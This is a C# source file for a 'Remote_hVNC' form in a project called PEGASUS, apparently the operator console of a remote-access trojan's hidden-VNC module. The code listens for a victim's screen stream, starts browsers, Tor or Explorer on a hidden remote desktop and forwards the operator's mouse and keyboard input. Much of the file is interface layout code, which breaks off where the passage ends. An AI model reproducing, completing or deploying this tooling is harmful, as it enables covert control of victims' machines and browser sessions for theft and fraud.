using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using PEGASUS.Connection;
using PEGASUS.Forms.CustomControls;
using PEGASUS.Tools;
using PEGASUS.Tools.Enum;
using PEGASUS.Tools.MouseKeyHook;
using PEGASUS.Utilities;
using Siticone.UI.WinForms;
using Sockets;

namespace PEGASUS.Forms
{

	public class Remote_hVNC : Form
	{
		private CancellationTokenSource source = new CancellationTokenSource();

		private TcpClientSession _tcs;

		private Clients _ths;

		private string _tital;

		private int Network_Traffic;

		private RemotehVNCTcpServer _rvm;

		public object ObjStatus = new object();

		public bool Statusing;

		private int RecvBytes;

		private Task statusbar;

		private IKeyboardMouseEvents _keyboardHook;

		private IKeyboardMouseEvents _mouseHook;

		private List<Keys> _keysPressed;

		private UnsafeStreamCodec StreamCodec;

		private Point formPoint;

		private bool formMove;

		private string strHVNCBrowser;

		private IContainer components;

		private RapidPictureBox picHVNC;

		private Panel panelTitleBar;

		private PictureBox picTitleIcon;

		private SiticonePanel siticonePanel1;

		private SiticonePictureBox picDesktop;

		private SiticonePanel Panel2;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2ResizeForm guna2ResizeForm1;

		private Guna2NumericUpDown NumericUpDown;

		private Guna2GradientButton guna2GradientButton6;

		private Guna2GradientButton guna2GradientButton7;

		private Guna2GradientButton guna2GradientButton4;

		private Guna2GradientButton guna2GradientButton5;

		private Guna2GradientButton guna2GradientButton2;

		private Guna2GradientButton guna2GradientButton3;

		private Guna2GradientButton guna2GradientButton1;

		private Guna2GradientButton btnStartL;

		private Guna2ControlBox guna2ControlBox3;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2GradientButton btnPalemoon;

		private BunifuLabel bunifuLabel1;

		private Guna2GradientButton btnTor;

		private Guna2GradientButton btnPowershell;

		private Guna2GradientButton btn360;

		private BunifuLabel bunifuLabel2;

		private Label label1;

		public Remote_hVNC(string strhVNC, TcpClientSession tcs)
		{
			InitializeComponent();
			_tcs = tcs;
		}

		private void Remote_hVNC_Load(object sender, EventArgs e)
		{
			try
			{
				SubscribeEvents();
				_rvm = new RemotehVNCTcpServer(6667);
				_rvm._ClientMessage = UpdateRemotehVNC_Image;
				_rvm.Listen();
				statusbar = Task.Factory.StartNew((Func<Task>)async delegate
				{
					await UpdateStatusBar();
				}, TaskCreationOptions.LongRunning);
				_keysPressed = new List<Keys>();
				picHVNC.Start();
				Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - Explorer hVNC";
				strHVNCBrowser = "Explorer";
				_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
				base.FormClosed += Remote_hVNC_FormClosed;
			}
			catch
			{
			}
		}

		public void startconn()
		{
			try
			{
				SubscribeEvents();
				_rvm = new RemotehVNCTcpServer(6667);
				_rvm._ClientMessage = UpdateRemotehVNC_Image;
				_rvm.Listen();
				statusbar = Task.Factory.StartNew((Func<Task>)async delegate
				{
					await UpdateStatusBar();
				}, TaskCreationOptions.LongRunning);
				_keysPressed = new List<Keys>();
				picHVNC.Start();
				base.FormClosed += Remote_hVNC_FormClosed;
			}
			catch
			{
			}
		}

		private void Remote_hVNC_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				if (statusbar != null)
				{
					if (!statusbar.IsCompleted)
					{
						source.Cancel();
					}
					statusbar.Dispose();
				}
				if (source != null)
				{
					source.Dispose();
				}
				if (_rvm != null)
				{
					_rvm?.Close();
				}
				if (_tcs != null)
				{
					_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Stop"));
				}
				UnsubscribeEvents();
			}
			catch
			{
			}
			finally
			{
				statusbar = null;
				source = null;
				_rvm = null;
				_tcs = null;
			}
		}

		private void SubscribeEvents()
		{
			if (PlatformHelper.RunningOnMono)
			{
				base.KeyDown += OnKeyDown;
				base.KeyUp += OnKeyUp;
				return;
			}
			_keyboardHook = Hook.GlobalEvents();
			_keyboardHook.KeyDown += OnKeyDown;
			_keyboardHook.KeyUp += OnKeyUp;
			_mouseHook = Hook.AppEvents();
			_mouseHook.MouseWheel += OnMouseWheelMove;
		}

		private void UnsubscribeEvents()
		{
			if (PlatformHelper.RunningOnMono)
			{
				base.KeyDown -= OnKeyDown;
				base.KeyUp -= OnKeyUp;
				return;
			}
			if (_keyboardHook != null)
			{
				_keyboardHook.KeyDown -= OnKeyDown;
				_keyboardHook.KeyUp -= OnKeyUp;
				_keyboardHook.Dispose();
			}
			if (_mouseHook != null)
			{
				_mouseHook.MouseWheel -= OnMouseWheelMove;
				_mouseHook.Dispose();
			}
		}

		private void btnChrome_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - Chrome hVNC";
			strHVNCBrowser = "Chrome";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnFirefox_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - Firefox hVNC";
			strHVNCBrowser = "Firefox";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnIE_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - IExplorer hVNC";
			strHVNCBrowser = "IExplorer";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnExplorer_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - Explorer hVNC";
			strHVNCBrowser = "Explorer";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnRun_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - Run hVNC";
			strHVNCBrowser = "Run";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void siticoneRoundedGradientButton6_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - Tor hVNC";
			strHVNCBrowser = "Tor";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnSkype_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - Skype hVNC";
			strHVNCBrowser = "Skype";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnBrave_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - Brave hVNC";
			strHVNCBrowser = "Brave";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnEdge_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - MS Edge hVNC";
			strHVNCBrowser = "Edge";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnPaleMoon_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - PaleMoon hVNC";
			strHVNCBrowser = "PaleMoon";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnWaterFor_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - WaterFox hVNC";
			strHVNCBrowser = "Waterfox";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btn360_Click(object sender, EventArgs e)
		{
			Text = "\\\\" + _tcs._remoteEndPoint.Address.ToString() + " - 360 hVNC";
			strHVNCBrowser = "360";
			_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("Start:" + strHVNCBrowser));
		}

		private void btnMini_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void btnMaxi_Click(object sender, EventArgs e)
		{
			if (base.WindowState == FormWindowState.Normal)
			{
				Remote_HVNC_Maximize();
			}
			else if (base.WindowState == FormWindowState.Maximized)
			{
				Remote_HVNC_Restore();
			}
		}

		private void btnClose_Click(object sender, EventArgs e)
		{
			Close();
		}

		private void panelTitleBar_MouseDown(object sender, MouseEventArgs e)
		{
			formPoint = default(Point);
			if (e.Button == MouseButtons.Left)
			{
				formPoint = new Point(-e.X - SystemInformation.FrameBorderSize.Width, -e.Y - SystemInformation.CaptionHeight - SystemInformation.FrameBorderSize.Height);
				formMove = true;
			}
		}

		private void panelTitleBar_MouseMove(object sender, MouseEventArgs e)
		{
			if (formMove)
			{
				Point mousePosition = Control.MousePosition;
				mousePosition.Offset(formPoint.X, formPoint.Y + panelTitleBar.Height);
				base.Location = mousePosition;
			}
		}

		private void panelTitleBar_MouseUp(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				formMove = false;
			}
		}

		private void picHVNC_MouseDown(object sender, MouseEventArgs e)
		{
			if (picHVNC.Image != null && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = GetRemoteWidth(localX);
				int remoteHeight = GetRemoteHeight(localY);
				MouseAction mouseAction = MouseAction.None;
				if (e.Button == MouseButtons.Left)
				{
					mouseAction = MouseAction.LeftDown;
				}
				if (e.Button == MouseButtons.Right)
				{
					mouseAction = MouseAction.RightDown;
				}
				_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("action_mouse:" + mouseAction.ToString() + ",press:" + true + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight));
			}
		}

		private void picHVNC_MouseUp(object sender, MouseEventArgs e)
		{
			if (picHVNC.Image != null && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = GetRemoteWidth(localX);
				int remoteHeight = GetRemoteHeight(localY);
				MouseAction mouseAction = MouseAction.None;
				if (e.Button == MouseButtons.Left)
				{
					mouseAction = MouseAction.LeftUp;
				}
				if (e.Button == MouseButtons.Right)
				{
					mouseAction = MouseAction.RightUp;
				}
				_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("action_mouse:" + mouseAction.ToString() + ",press:" + true + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight));
			}
		}

		private void picHVNC_MouseMove(object sender, MouseEventArgs e)
		{
			if (picHVNC.Image != null && base.ContainsFocus)
			{
				int localX = e.X;
				int localY = e.Y;
				int remoteWidth = GetRemoteWidth(localX);
				int remoteHeight = GetRemoteHeight(localY);
				_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("action_mouse:" + MouseAction.MoveCursor.ToString() + ",press:" + false + ",remote_x:" + remoteWidth + ",remote_y:" + remoteHeight));
			}
		}

		private void OnMouseWheelMove(object sender, MouseEventArgs e)
		{
			if (picHVNC.Image != null && base.ContainsFocus)
			{
				_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("action_mouse:" + ((e.Delta > 0) ? MouseAction.ScrollUp : MouseAction.ScrollDown).ToString() + ",press:" + false + ",remote_x:" + 0 + ",remote_y:" + 0 + ",moniter:" + 0));
			}
		}

		private void OnKeyDown(object sender, KeyEventArgs e)
		{
			if (picHVNC.Image == null || !base.ContainsFocus)
			{
				return;
			}
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			if (!_keysPressed.Contains(e.KeyCode))
			{
				_ = (byte)e.KeyCode;
				if (e.KeyCode != Keys.ShiftKey && e.Modifiers.ToString() == "Shift")
				{
					User32Interop.ToAscii(e.KeyCode, Keys.ShiftKey);
				}
				_keysPressed.Add(e.KeyCode);
			}
		}

		private void OnKeyUp(object sender, KeyEventArgs e)
		{
			if (picHVNC.Image != null && base.ContainsFocus)
			{
				if (!IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				_keysPressed.Remove(e.KeyCode);
				byte b = (byte)e.KeyCode;
				bool flag = false;
				if ((_keysPressed.Contains(Keys.LShiftKey) || _keysPressed.Contains(Keys.RShiftKey)) && e.KeyCode != Keys.ShiftKey)
				{
					b = (byte)User32Interop.ToAscii(e.KeyCode, Keys.ShiftKey);
					flag = true;
				}
				_tcs?.Client_Send(DataType.RemoteHVNCType, Encoding.UTF8.GetBytes("keyboard_mouse:" + b + ",press:" + false + ",is_char:" + flag));
			}
		}

		public async Task UpdateStatusBar()
		{
			Remote_hVNC remoteHVNC = this;
			while (!remoteHVNC.source.IsCancellationRequested)
			{
				await Task.Delay(1000);
				remoteHVNC.Network_Traffic += remoteHVNC.RecvBytes;
				remoteHVNC.Text = remoteHVNC._tital + "   Download Speed: " + remoteHVNC.RecvBytes / 1024 + " KB    Downloaded Traffic: " + remoteHVNC.GetFileSize(remoteHVNC.Network_Traffic);
				remoteHVNC.RecvBytes = 0;
			}
		}

		private int GetRemoteWidth(int localX)
		{
			return localX * picHVNC.ScreenWidth / picHVNC.Width;
		}

		private int GetRemoteHeight(int localY)
		{
			return localY * picHVNC.ScreenHeight / picHVNC.Height;
		}

		private bool IsLockKey(Keys key)
		{
			if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
			{
				return (key & Keys.Scroll) == Keys.Scroll;
			}
			return true;
		}

		private void UpdateRemotehVNC_Image(byte[] message)
		{
			int imageQuality = Convert.ToInt32(NumericUpDown.Value);
			try
			{
				if (StreamCodec == null)
				{
					StreamCodec = new UnsafeStreamCodec(imageQuality, 0, "1920x1080");
				}
				if (Encoding.UTF8.GetString(message).Contains("BlockInput:Fail"))
				{
					Invoke((MethodInvoker)delegate
					{
						MessageBox.Show("The input block function failed, you need to use administrator privileges");
					});
				}
				else
				{
					using MemoryStream inStream = new MemoryStream(message);
					UpdataPictureBox(StreamCodec.DecodeData(inStream));
				}
				RecvBytes += message.Length + 4;
			}
			catch
			{
			}
		}

		private void UpdataPictureBox(Image returnImage)
		{
			if (picHVNC.InvokeRequired)
			{
				picHVNC.Invoke((MethodInvoker)delegate
				{
					picHVNC.UpdateImage(new Bitmap(returnImage), cloneBitmap: true);
				});
			}
			else
			{
				picHVNC.Image = returnImage;
			}
		}

		private string GetFileSize(double size)
		{
			try
			{
				if (size >= 0.0 && size < 1024.0)
				{
					return size + " Bytes";
				}
				double num = size / 1024.0;
				if (num >= 1.0 && num < 1024.0)
				{
					return num.ToString("#.0") + " KB";
				}
				double num2 = size / 1048576.0;
				if (num2 >= 1.0 && num2 < 1024.0)
				{
					return num2.ToString("#.0") + " MB";
				}
				double num3 = size / 1073741824.0;
				return (num3 >= 1.0) ? (num3.ToString("#.0") + " GB") : null;
			}
			catch
			{
				return null;
			}
		}

		private void Remote_HVNC_Maximize()
		{
			base.WindowState = FormWindowState.Maximized;
			panelTitleBar.Location = new Point(0, 0);
			panelTitleBar.Size = new Size(1920, 26);
			picHVNC.Location = new Point(0, 26);
			picHVNC.Size = new Size(1920, 1054);
		}

		private void Remote_HVNC_Restore()
		{
			base.WindowState = FormWindowState.Normal;
			panelTitleBar.Location = new Point(0, 0);
			panelTitleBar.Size = new Size(1000, 26);
			picHVNC.Location = new Point(0, 26);
			picHVNC.Size = new Size(1000, 564);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Remote_hVNC));
			panelTitleBar = new System.Windows.Forms.Panel();
			label1 = new System.Windows.Forms.Label();
			guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			picTitleIcon = new System.Windows.Forms.PictureBox();
			siticonePanel1 = new Siticone.UI.WinForms.SiticonePanel();
			btnTor = new Guna.UI2.WinForms.Guna2GradientButton();
			btnPowershell = new Guna.UI2.WinForms.Guna2GradientButton();
			btn360 = new Guna.UI2.WinForms.Guna2GradientButton();
			btnPalemoon = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton6 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton7 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton5 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
			btnStartL = new Guna.UI2.WinForms.Guna2GradientButton();
			NumericUpDown = new Guna.UI2.WinForms.Guna2NumericUpDown();
			bunifuLabel2 = new Bunifu.UI.WinForms.BunifuLabel();
			bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
			picDesktop = new Siticone.UI.WinForms.SiticonePictureBox();
			Panel2 = new Siticone.UI.WinForms.SiticonePanel();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2ResizeForm1 = new Guna.UI2.WinForms.Guna2ResizeForm(components);
			picHVNC = new Forms.CustomControls.RapidPictureBox();
			panelTitleBar.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)picTitleIcon).BeginInit();
			siticonePanel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)NumericUpDown).BeginInit();
			((System.ComponentModel.ISupportInitialize)picDesktop).BeginInit();
			((System.ComponentModel.ISupportInitialize)picHVNC).BeginInit();
			SuspendLayout();
			panelTitleBar.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			panelTitleBar.Controls.Add(label1);
			panelTitleBar.Controls.Add(guna2ControlBox3);
			panelTitleBar.Controls.Add(guna2ControlBox2);
			panelTitleBar.Controls.Add(guna2ControlBox1);
			panelTitleBar.Controls.Add(picTitleIcon);
			panelTitleBar.Dock = System.Windows.Forms.DockStyle.Top;
			panelTitleBar.Location = new System.Drawing.Point(0, 0);
			panelTitleBar.Name = "panelTitleBar";
			panelTitleBar.Size = new System.Drawing.Size(1000, 67);
			panelTitleBar.TabIndex = 0;
			panelTitleBar.MouseDown += new System.Windows.Forms.MouseEventHandler(panelTitleBar_MouseDown);
			panelTitleBar.MouseMove += new System.Windows.Forms.MouseEventHandler(panelTitleBar_MouseMove);
			panelTitleBar.MouseUp += new System.Windows.Forms.MouseEventHandler(panelTitleBar_MouseUp);
			label1.Anchor = System.Windows.Forms.AnchorStyles.Top;
			label1.AutoSize = true;
			label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.LightGray;
			label1.Location = new System.Drawing.Point(451, 15);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(86, 19);
			label1.TabIndex = 64;
			label1.Text = "C# HVNC";
			guna2ControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox3.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2ControlBox3.HoverState.Parent = guna2ControlBox3;
			guna2ControlBox3.IconColor = System.Drawing.Color.White;
			guna2ControlBox3.Location = new System.Drawing.Point(841, 10);
			guna2ControlBox3.Name = "guna2ControlBox3";
			guna2ControlBox3.ShadowDecoration.Parent = guna2ControlBox3;
			guna2ControlBox3.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox3.TabIndex = 9;
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(892, 10);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox2.TabIndex = 8;
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
			guna2ControlBox1.Location = new System.Drawing.Point(943, 10);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox1.TabIndex = 7;
			picTitleIcon.Image = (System.Drawing.Image)resources.GetObject("picTitleIcon.Image");
			picTitleIcon.Location = new System.Drawing.Point(7, 10);
			picTitleIcon.Name = "picTitleIcon";
			picTitleIcon.Size = new System.Drawing.Size(40, 29);
			picTitleIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			picTitleIcon.TabIndex = 6;
			picTitleIcon.TabStop = false;
			siticonePanel1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			siticonePanel1.Controls.Add(btnTor);
			siticonePanel1.Controls.Add(btnPowershell);
			siticonePanel1.Controls.Add(btn360);
			siticonePanel1.Controls.Add(btnPalemoon);
			siticonePanel1.Controls.Add(guna2GradientButton6);
			siticonePanel1.Controls.Add(guna2GradientButton7);
			siticonePanel1.Controls.Add(guna2GradientButton4);
			siticonePanel1.Controls.Add(guna2GradientButton5);
			siticonePanel1.Controls.Add(guna2GradientButton2);
			siticonePanel1.Controls.Add(guna2GradientButton3);
			siticonePanel1.Controls.Add(guna2GradientButton1);
			siticonePanel1.Controls.Add(btnStartL);
			siticonePanel1.Controls.Add(NumericUpDown);
			siticonePanel1.Controls.Add(bunifuLabel2);
			siticonePanel1.Controls.Add(bunifuLabel1);
			siticonePanel1.Dock = System.Windows.Forms.DockStyle.Bottom;
			siticonePanel1.Location = new System.Drawing.Point(0, 537);
			siticonePanel1.Name = "siticonePanel1";
			siticonePanel1.ShadowDecoration.Parent = siticonePanel1;
			siticonePanel1.Size = new System.Drawing.Size(1000, 111);
			siticonePanel1.TabIndex = 6;
			btnTor.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnTor.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnTor.BorderThickness = 1;
			btnTor.CheckedState.Parent = btnTor;
			btnTor.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnTor.CustomImages.Parent = btnTor;
			btnTor.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnTor.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnTor.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnTor.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnTor.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnTor.DisabledState.Parent = btnTor;
			btnTor.Enabled = false;
			btnTor.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnTor.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnTor.Font = new System.Drawing.Font("Electrolize", 9f);
			btnTor.ForeColor = System.Drawing.Color.White;
			btnTor.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnTor.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnTor.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnTor.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnTor.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnTor.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnTor.HoverState.Parent = btnTor;
			btnTor.Location = new System.Drawing.Point(314, 64);
			btnTor.Name = "btnTor";
			btnTor.ShadowDecoration.Parent = btnTor;
			btnTor.Size = new System.Drawing.Size(147, 25);
			btnTor.TabIndex = 152;
			btnTor.Text = "Start Tor";
			btnPowershell.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			btnPowershell.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnPowershell.BorderThickness = 1;
			btnPowershell.CheckedState.Parent = btnPowershell;
			btnPowershell.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnPowershell.CustomImages.Parent = btnPowershell;
			btnPowershell.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btnPowershell.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btnPowershell.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPowershell.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPowershell.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnPowershell.DisabledState.Parent = btnPowershell;
			btnPowershell.Enabled = false;
			btnPowershell.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnPowershell.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPowershell.Font = new System.Drawing.Font("Electrolize", 9f);
			btnPowershell.ForeColor = System.Drawing.Color.White;
			btnPowershell.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnPowershell.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnPowershell.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnPowershell.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnPowershell.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnPowershell.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnPowershell.HoverState.Parent = btnPowershell;
			btnPowershell.Location = new System.Drawing.Point(845, 64);
			btnPowershell.Name = "btnPowershell";
			btnPowershell.ShadowDecoration.Parent = btnPowershell;
			btnPowershell.Size = new System.Drawing.Size(147, 25);
			btnPowershell.TabIndex = 151;
			btnPowershell.Text = "Powershell";
			btn360.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btn360.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btn360.BorderThickness = 1;
			btn360.CheckedState.Parent = btn360;
			btn360.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btn360.CustomImages.Parent = btn360;
			btn360.DisabledState.BorderColor = System.Drawing.Color.DimGray;
			btn360.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btn360.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btn360.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btn360.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btn360.DisabledState.Parent = btn360;
			btn360.Enabled = false;
			btn360.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btn360.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btn360.Font = new System.Drawing.Font("Electrolize", 9f);
			btn360.ForeColor = System.Drawing.Color.White;
			btn360.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btn360.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btn360.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btn360.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btn360.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btn360.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btn360.HoverState.Parent = btn360;
			btn360.Location = new System.Drawing.Point(161, 64);
			btn360.Name = "btn360";
			btn360.ShadowDecoration.Parent = btn360;
			btn360.Size = new System.Drawing.Size(147, 25);
			btn360.TabIndex = 150;
			btn360.Text = "Start 360";
			btn360.Click += new System.EventHandler(btn360_Click);
			btnPalemoon.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			btnPalemoon.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnPalemoon.BorderThickness = 1;
			btnPalemoon.CheckedState.Parent = btnPalemoon;
			btnPalemoon.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnPalemoon.CustomImages.Parent = btnPalemoon;
